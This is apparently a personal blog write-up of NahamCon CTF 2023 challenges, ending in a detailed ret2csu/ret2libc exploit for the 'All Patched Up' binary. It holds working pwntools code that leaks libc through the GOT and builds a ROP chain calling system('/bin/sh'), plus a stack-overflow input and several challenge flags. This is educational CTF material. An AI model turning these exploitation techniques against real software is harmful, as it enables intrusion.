---
title: "nahamctf 2023"
date: 2023-02-01T12:13:32+05:30
description: "I wanted to ROP, but it was too much for too little time. Some brief writeups and a good PWN breakdown at bottom."
tags: [python, GOT, pwn, web, ret2libc]
---

I keep having busy weekends and I wish I had a touch more time to grind out the challenges I had left for this CTF. Awesome challenges by the authors! Thanks for the fun CTF nahamsec team!

## Glasses

```txt
50 points - Warmups - 955 Solves - easy
Author: @JohnHammond#6971

Everything is blurry, I think I need glasses! 
```

We can't inspect element with a mouseclick. No worries, just use the keyboard shortcut (or on Mac the menu still pops).
From here, we can search for `flag` in the source and we just need to parse this string to fit the format.

`flag½₧8084e4530cf649814456f2a291eb81e9½―` to `flag{8084e4530cf649814456f2a291eb81e9}`

## Fast Hands

```txt
50 points - Warmups - 1204 Solves - easy
Author: @JohnHammond#6971

You can capture the flag, but you gotta be fast! 
```

Check the source, see it calls this function to open a new page.
Open that page and check source to see a flag there hidden!

## tiny little fibers

```txt
420 points - Warmups - 128 Solves - easy
Author: @JohnHammond#6971

Oh wow, it's another of everyone's favorite. But we like to try and turn the ordinary into extraordinary! 

Download the file(s) below.
Attachments: tiny-little-fibers
```

Pop this bad boi into Binary Ninja. Head over to the strings thing first to look for flag.
No flag but `fla` turns up this maddness:

```hex
f\x00l\x00a\x00\n\x00g\x00{\x002\x00\n\x002\x00c\x005\x00\n\x003\x004\x00c\x00\n\x005\x00a\x00b\x00\n\x00e\x00a\x008\x00\n\x004\x00b\x00f\x00\n\x006\x00c\x001\x00\n\x001\x009\x003\x00\n\x00e\x002\x006\x00\n\x003\x00f\x007\x00\n\x002\x005\x009\x00\n\x00f\x00}
```

This translates too: `flag{22c534c5abea84bf6c1193e263f7259f}`

## Open Seaseme

```txt
50 points - Binary Exploitation - 391 Solves - easy
Author: @JohnHammond#6971

Something about forty thieves or something? I don't know, they must have had some secret incantation to get the gold! 

Download the files below and press the Start button in the top-right to begin this challenge. 

Special thank you to HALBORN for sponsoring NahamCon 2023 CTF! This category is dedicated to them as a token of gratitude. 

Attachments: open_sesame.c open_sesame
```

Upon opening the binary, we can see a few things:

```c
#define SECRET_PASS "OpenSesame!!!"
//...
// Compare the start of our input to the secret passcode
Bool isPasswordCorrect(char *input) {
    return (strncmp(input, SECRET_PASS, strlen(SECRET_PASS)) == 0) ? yes : no;
}
// If our password is correct and we overflow the bool, we can get the flag
void caveOfGold() {
    Bool caveCanOpen = no;
    char inputPass[256];
    //...
    scanf("%s", inputPass);
    if (caveCanOpen == no) {
        puts("Sorry, the cave will not open right now!");
        return;
    }
    if (isPasswordCorrect(inputPass) == yes) {
        puts("YOU HAVE PROVEN YOURSELF WORTHY HERE IS THE GOLD:");
        flag();
    }
    //...
}
```

With this in mind, we need to start with `OpenSesame!!!` to pass the check; then, to successfully overflow into `caveCanOpen` we pass in `1`'s so that we overwrite `0` with `1`. This will flip the Bool from false to true and then out password will pass the check.

```bash
┌──(root㉿8f1b1e4b13e1)-[~/workspace/ctf/NahmonCTF2023]
└─# nc challenge.nahamcon.com 32743
BEHOLD THE CAVE OF GOLD

What is the magic enchantment that opens the mouth of the cave?
OpenSesame!!!1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
YOU HAVE PROVEN YOURSELF WORTHY HERE IS THE GOLD:
flag{85605e34d3d2623866c57843a0d2c4da}
```

## All Patched Up

```txt
All Patched Up
413 points - Binary Exploitation - 68 Solves - medium
Author: @M_alpha#3534

Do you really know how to ret2libc? 

Download the files below and press Start on the top-right to begin this challenge.

Attachments: libc-2.31.so, all_patched_up, Dockerfile
```

I want to ROP, so I decided to give this challenge a shot. I sadly didn't solve the remote server during the runtime of the competition but I'm going to break down my work to get it running locally, the issue I ran into on the server, and how I fixed it after seeing other solves.

Opening this binary up in Binary Ninja, we can see it looks really bare with only 3 functions included. We have `write()`, `read()`, and `setbuf()`... we'll probably only really need two of those however since we can't do much with `setbuf()`. We're also given a version of LibC that still contains the `__libc_csu_init()` which has a lot of helpful ROP gadgets for us to make use of. Let's just take a quick look at these functions and the calling conventions / gadgets available.

Starting with `__libc_csu_init()`, we have two really helpful sections that can allow us to control majority of the registers. These are:

```x86asm
00401230  4c89f2             mov     rdx, r14
00401233  4c89ee             mov     rsi, r13
00401236  4489e7             mov     edi, r12d
00401239  41ff14df           call    qword [r15+rbx*8]
0040123d  4883c301           add     rbx, 0x1
00401241  4839dd             cmp     rbp, rbx
00401244  75ea               jne     0x401230

00401246  4883c408           add     rsp, 0x8
0040124a  5b                 pop     rbx {__saved_rbx}
0040124b  5d                 pop     rbp {__saved_rbp}
0040124c  415c               pop     r12 {__saved_r12}
0040124e  415d               pop     r13 {__saved_r13}
00401250  415e               pop     r14 {__saved_r14}
00401252  415f               pop     r15 {__saved_r15}
00401254  48c7c701000000     mov     rdi, 0x1
0040125b  c3                 retn     {__return_addr}
```

The first set of instructions allows us to populate `rdx, rsi, and edi`, but wait we don't control `r14, r13, and r12d`? Actually, the next set of instructions with the 6 `pop` instructions gives us complete control to pass in `rbx, rbp, r12, r13, r14, and r15`. Essentially, we end up with complete control over `rdx, rsi, edi, rbx, rbp, r12, r13, r14, and r15` which is huge for trying to solve any challenge with ROP. For this writeup, we'll call these two pieces CSU1 and CSU2. If you're curious about this, there are a lot of great resources on `ret2csu` as it's called or you can check out pwntools automation for it [here](https://github.com/Gallopsled/pwntools/blob/91be8af121/pwnlib/rop/rop.py#L1489-L1565).

With any good `ret2libc` problem, we need to leak the address of a function or address that currently resides in LibC. Since this is usually done with the GOT, we'll probably take that road. However, there is only a single output function in this binary that's not the normal `puts()` or `printf()`, so we'll need to figure out what we're allowed to pass to it. The function in the `.extern` sections breaks down the arguments like this:

```c
00404080  extern ssize_t write(int32_t fd, void const* buf, uint64_t nbytes)
```

We need to pass in three arguments:

RDI: A file descriptor (STDOUT in this case)
RSI: A buffer that we want to output
RDX: The length of the buffer we want to write

With this knowledge equipped, we have the gadgets we need and the general flow of our exploit down. It'll look like this:

1. Buffer overflow to gain control flow
2. Use CSU1/CSU2 to populate a `write()` call that prints from the GOT to leak LibC function
3. Compute the LibC base
4. Return to `main`
5. Buffer overflow again to regain control flow
6. Make a ROP chain using LibC gadgets

Locally, I got it working using a chain like this:

```py
# Leak LibC using write()
r.raw(cyclic(520))                  # Overflow
r.raw(p64(0x401254))                # Set RDI to 1 (leak to STDOUT) [at end of CSU2]
r.call(p64(0x401064))               # Call write()
r.call(p64(e.sym['main']))          # Loop to main()
p.sendlineafter(b'>', bytes(r)) 

# Get LibC leak and Parse
stuff = p.recvuntil(b'>')
rand_val = u64(stuff[673:680] + b'\x00' * (8-len(stuff[673:680])))
libc.address = rand_val - 0x223190
r_libc = ROP(libc)

# ROP using LibC
chain = cyclic(520)                                     # Overflow
chain += p64(r_libc.find_gadget(['pop rdi', 'ret'])[0]) # Free RDI
chain += p64(next(libc.search(b'/bin/sh')))             # Add in our data
chain += p64(libc.sym['system'])                        # Call system()
p.sendline(chain)

# Shell!?
p.interactive()
```

This worked perfectly on my local machine and I was pumped. However, you might notice that I didn't really use much of what I talked about before. I call write but I barely populate any parameters. This was because running locally without trying to change the buffer, I noticed a ton of random stack data is leaked and there was a LibC address in there! Well perfect, I decided to use this to finish up my exploit and using `vmmap`, I manually computed the offset and it was working reliably. Send it remote, no dice. Of course, I try again...

What went wrong? I learned the reason for the Dockerfile was becuase the stack leak doesn't happen on the remote server (or if it does not in the same order as locally running exploits). Rats... back to the drawing board again. So now we need to actually use CSU1 and CSU2 to make this work, but I sadly got lost here with the same error over and over. My code looked like this:

```py
p = start()

# Leak libc using write()
r.raw(cyclic(520))

# ROP into GOT
r.raw(p64(0x40124a))        # CSU1
r.raw(p64(0x40101a//8))     # Padding CSU1 (rbx)
r.raw(p64(0x40101a))        # Padding CSU1 (rbp)
r.raw(p64(0x40101a))        # Padding CSU1 (r12)
r.raw(p64(e.got['write']))  # Data I want to print (r13)
r.raw(p64(0x40101a))        # Padding CSU1 (r14)
r.raw(p64(0x0))             # Padding CSU1 (r15)
r.raw(p64(0x401230))        # CSU2
r.call(p64(0x401064))       # Call write()
r.call(p64(e.sym['main']))  # Loop on main()
p.sendlineafter(b'>', bytes(r))

#...
p.interactive()
```

I kept running into the same error where `Invalid address 0xc308c4` was popping up in GDB. Walking through, I kept getting stuck on this part of CSU2:

```x86asm
 ► 0x401239 <__libc_csu_init+73>     call   qword ptr [r15 + rbx*8]       <0xc308c4>
        rdi: 0x40101a (_init+26) ◂— ret
        rsi: 0x404018 (write@got[plt]) —▸ 0x7efde7602060 (write) ◂— endbr64
        rdx: 0x40101a (_init+26) ◂— ret
        rcx: 0x7efde7601fd2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
```

What's going on here... we're trying to call a function. However, the way we know which address we're calling is determined by using the contents of memory at the location of `r15 + rbx*8`. My brain kept trying to make the math of times eight work hence the floor divison to get an integer value for just even a `ret`. If I divide by eight, and it multiplies by eight, obviously this works when added with zero. Or so I thought... this killed my momentum and I hit a wall. How was I supposed to know which address I'm heading towards in this case and how could I find the right dereference math to pull it off?

Hahahaha, what a fool I was as it's an easy fix. We can point to `write()` and then simply `0x0 RBX` so that math doesn't matter. When we dereference the GOT entry of `write()`, it's pointing to LibC which is perfectly fine and will execute what we want anyways. Let's look at our exploit now:

```py
# ROP into GOT
r.raw(p64(0x40124a))        # CSU1
r.raw(p64(0x0))             # RBX: 0x0 to skip doing RBX*8
r.raw(p64(0x1))             # RBP: Padding
r.raw(p64(0x1))             # R12/RDI: Write to STDOUT
r.raw(p64(e.got['write']))  # R13/RSI: Buffer to print (LibC address)
r.raw(p64(0x8))             # R14/RDX: Number of bytes to write()
r.raw(p64(e.got['write']))  # R15: Points to write() for our call mismatch
r.raw(p64(0x401230))        # CSU2
r.raw(cyclic(56))           # Padding for pops of CSU1 after CSU2 completes
r.call(p64(e.sym['main']))  # Loop back to main()

p.sendlineafter(b'>', bytes(r))
```

This looks great and we can step through our exploit and see our previous `Invalid address 0xc308c4` when doing the `call` in CSU2 no longer happens. Instead, we can see this as our `call` when we execute it:

```x86asm
 ► 0x401239 <__libc_csu_init+73>     call   qword ptr [r15 + rbx*8]       <write>
        rdi: 0x1
        rsi: 0x404018 (write@got[plt]) —▸ 0x7fe401c9c060 (write) ◂— endbr64
        rdx: 0x8
        rcx: 0x7fe401c9bfd2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
```

This is correct as I'm calling `write()` and we're printing the correct data to the correct spot for the right amount of characters. This obviously required changing up my leak and parsing but the rest of the exploit stayed looking like this:

```py
# Get LibC leak and Parse
stuff = p.recvuntil(b'>')
write_val = u64(stuff[1:7] + b'\x00' * (8-len(stuff[:6])))
libc.address = write_val - libc.sym["write"]
r_libc = ROP(libc)

# ROP using LibC
chain = cyclic(520)                                     # Overflow
chain += p64(r_libc.find_gadget(['ret'])[0])            # Realign stack
chain += p64(r_libc.find_gadget(['pop rdi', 'ret'])[0]) # Free RDI
chain += p64(next(libc.search(b'/bin/sh')))             # Add in our data
chain += p64(libc.sym['system'])                        # Call system()
p.sendline(chain)

# Shell!?
p.interactive()
```

We changed our leak to recieve only the 6 bytes we want for our controlled LibC leak. We know this is the address of `write()` in LibC so we can use pwntools to automate grabbing the offset and computing the base address. With this all set, we use the same chain to call `system("/bin/sh")` and now we pop a shell remotely!
